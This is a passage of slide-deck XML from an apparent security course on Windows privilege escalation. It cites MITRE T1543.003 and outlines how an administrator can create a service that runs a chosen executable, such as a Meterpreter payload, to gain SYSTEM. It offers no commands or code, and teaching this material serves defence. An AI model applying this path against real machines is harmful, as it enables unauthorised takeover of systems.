            <a:off x="1352550" y="1607425"/>
            <a:ext cx="7517100" cy="6213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nvGrpSpPr>
          <p:cNvPr id="885" name="Google Shape;885;p105"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="457200" y="1607413"/>
            <a:ext cx="776889" cy="621300"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="776889" cy="621300"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="886" name="Google Shape;886;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="6213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Roboto Medium"/>
                  <a:ea typeface="Roboto Medium"/>
                  <a:cs typeface="Roboto Medium"/>
                  <a:sym typeface="Roboto Medium"/>
                </a:rPr>
                <a:t>01</a:t>
              </a:r>
              <a:endParaRPr sz="3000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="887" name="Google Shape;887;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="969614" y="1607625"/>
              <a:ext cx="340325" cy="188625"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="888" name="Google Shape;888;p105"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="457200" y="2457325"/>
            <a:ext cx="776889" cy="621300"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="776889" cy="621300"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="889" name="Google Shape;889;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="621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Roboto Medium"/>
                  <a:ea typeface="Roboto Medium"/>
                  <a:cs typeface="Roboto Medium"/>
                  <a:sym typeface="Roboto Medium"/>
                </a:rPr>
                <a:t>02</a:t>
              </a:r>
              <a:endParaRPr sz="3000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="890" name="Google Shape;890;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="969614" y="1607625"/>
              <a:ext cx="340325" cy="188625"/>
            </a:xfrm>
            <a:prstGeom prst="flowChartExtra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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="891" name="Google Shape;891;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1352550" y="1649800"/>
            <a:ext cx="7415400" cy="606900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="0" lIns="182875" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Low-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>privilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> user &gt; High-privilege user &gt; SYSTEM</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="892" name="Google Shape;892;p105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1352550" y="2459736"/>
            <a:ext cx="7517100" cy="6213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893" name="Google Shape;893;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1365025" y="2442000"/>
            <a:ext cx="5419200" cy="606900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="0" lIns="182875" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>High-privilege user &gt; SYSTEM</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="894" name="Google Shape;894;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="3508925"/>
            <a:ext cx="8613900" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>This is important because certain privilege escalation techniques are specific to a low-privilege user trying to escalate to a high-privilege user.</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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898" name="Shape 898"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="899" name="Google Shape;899;p106"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="12510" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="736600" y="1187400"/>
            <a:ext cx="7670800" cy="3420851"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="900" name="Google Shape;900;p106"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>We will focus on MITRE technique T1543.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>003:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="901" name="Google Shape;901;p106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="480400"/>
            <a:ext cx="7867200" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Create or modify system process: Windows service.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="906" name="Google Shape;906;p107"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="137162" y="1249094"/>
            <a:ext cx="8869675" cy="3473981"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="907" name="Google Shape;907;p107"/>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Privilege Escalation Techniques in Windows</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="908" name="Google Shape;908;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1794800"/>
            <a:ext cx="2177100" cy="1893900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>Services in Windows are crucial to the operating system running. </a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="909" name="Google Shape;909;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3285075" y="1728246"/>
            <a:ext cx="2371500" cy="1893900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>In addition, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>several third-party programs require and depend on services </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>to run. </a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="910" name="Google Shape;910;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6563725" y="1684375"/>
            <a:ext cx="2123100" cy="1893900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>Because of this, services always run </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>as SYSTEM by default. </a:t>
            </a:r>
            <a:endParaRPr sz="16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108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="511766" y="1931062"/>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16" name="Google Shape;916;p108"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="511772" y="1338389"/>
            <a:ext cx="533372" cy="533480"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="695400" cy="695450"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="917" name="Google Shape;917;p108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="621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1" i="0" lang="en" sz="1900" u="none" cap="none" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>01</a:t>
              </a:r>
              <a:endParaRPr b="1" i="0" sz="1900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="918" name="Google Shape;918;p108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="634726" y="1885638"/>
              <a:ext cx="34032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200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="919" name="Google Shape;919;p108"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3283547" y="1338389"/>
            <a:ext cx="533372" cy="533480"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="695400" cy="695450"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="920" name="Google Shape;920;p108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="621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1" i="0" lang="en" sz="1900" u="none" cap="none" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="082D49"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>02</a:t>
              </a:r>
              <a:endParaRPr b="1" i="0" sz="1900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="082D49"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="921" name="Google Shape;921;p108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="634726" y="1885638"/>
              <a:ext cx="34032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200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="082D49"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="922" name="Google Shape;922;p108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3283541" y="1931062"/>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23" name="Google Shape;923;p108"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6188672" y="1339139"/>
            <a:ext cx="533372" cy="533480"/>
            <a:chOff x="457200" y="1378813"/>
            <a:chExt cx="695400" cy="695450"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="924" name="Google Shape;924;p108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="457200" y="1378813"/>
              <a:ext cx="695400" cy="621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1" i="0" lang="en" sz="1900" u="none" cap="none" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="082D49"/>
                  </a:solidFill>
                  <a:latin typeface="Roboto"/>
                  <a:ea typeface="Roboto"/>
                  <a:cs typeface="Roboto"/>
                  <a:sym typeface="Roboto"/>
                </a:rPr>
                <a:t>03</a:t>
              </a:r>
              <a:endParaRPr b="1" i="0" sz="1900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="082D49"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="925" name="Google Shape;925;p108"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="634726" y="1885638"/>
              <a:ext cx="34032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200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="082D49"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="926" name="Google Shape;926;p108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6188666" y="1931812"/>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7" name="Google Shape;927;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="478650"/>
            <a:ext cx="9168600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="928" name="Google Shape;928;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347250" y="51200"/>
            <a:ext cx="8159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Privilege Escalation Techniques in Windows</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Also by default, administrators are allowed to create services, so our privilege  escalation attack path is clearly defined as follows:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="929" name="Google Shape;929;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="494250" y="2054436"/>
            <a:ext cx="2371500" cy="26628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As</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> an administrator, create a new service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in Windows.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">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t/>
            </a:r>
            <a:endParaRPr sz="1800">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t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="930" name="Google Shape;930;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3283550" y="2054435"/>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Tell the service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to execute an executable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of our choice, such as a Meterpreter payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">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t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
